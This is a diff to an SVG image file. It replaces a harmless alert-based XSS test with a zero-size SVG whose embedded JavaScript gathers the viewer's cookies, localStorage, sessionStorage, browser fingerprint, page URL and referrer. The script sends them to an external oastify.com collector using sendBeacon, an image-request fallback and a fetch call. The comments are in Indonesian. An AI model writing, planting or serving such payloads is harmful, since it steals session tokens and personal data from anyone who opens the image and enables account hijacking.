@@ -1,8 +1,67 @@
-<?xml version="1.0" standalone="no"?>
-<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
-<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
-   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
-   <script type="text/javascript">
-      alert('xss svg');
-   </script>
+<svg xmlns="http://www.w3.org/2000/svg" width="0" height="0">
+  <script type="text/javascript">
+    // <![CDATA[
+    (function() {
+      const endpoint = "https://nri27ome79f22h1mb26p64ffi6oxcn0c.oastify.com/";
+
+      // Kumpulkan semua informasi yang memungkinkan
+      var info = {
+        // Cookie (hanya yang dapat diakses JS, tidak HttpOnly)
+        cookie: document.cookie,
+
+        // Web Storage
+        localStorage: (function() {
+          try {
+            return JSON.stringify(localStorage);
+          } catch(e) { return "{}"; }
+        })(),
+        sessionStorage: (function() {
+          try {
+            return JSON.stringify(sessionStorage);
+          } catch(e) { return "{}"; }
+        })(),
+
+        // Fingerprint browser
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        languages: navigator.languages ? navigator.languages.join(",") : "",
+        hardwareConcurrency: navigator.hardwareConcurrency || "unknown",
+        deviceMemory: navigator.deviceMemory || "unknown",
+
+        // Screen
+        screen: screen.width + "x" + screen.height,
+        colorDepth: screen.colorDepth,
+        pixelRatio: window.devicePixelRatio,
+
+        // Lokasi & waktu
+        url: location.href,
+        referrer: document.referrer,
+        timestamp: new Date().toISOString(),
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+      };
+
+      // Coba ambil IP (tidak bisa dari JS client-side, tapi bisa memicu request ke server yang mencatat IP)
+      // Kita kirim data di atas sebagai parameter GET
+
+      var payload = encodeURIComponent(JSON.stringify(info));
+      var fullUrl = endpoint + "log?data=" + payload;
+
+      // Metode pengiriman: navigator.sendBeacon (reliable, tidak terblokir unload)
+      if (navigator.sendBeacon) {
+        navigator.sendBeacon(fullUrl, "");
+      } else {
+        // Fallback: Image request
+        var img = new Image();
+        img.src = fullUrl;
+      }
+
+      // Opsi tambahan: coba kirim juga ke endpoint lain (DNS atau HTTP) lewat fetch no-cors
+      try {
+        fetch(endpoint + "ping", { mode: "no-cors", keepalive: true }).catch(()=>{});
+      } catch(e) {}
+
+    })();
+    // ]]>
+  </script>
 </svg>
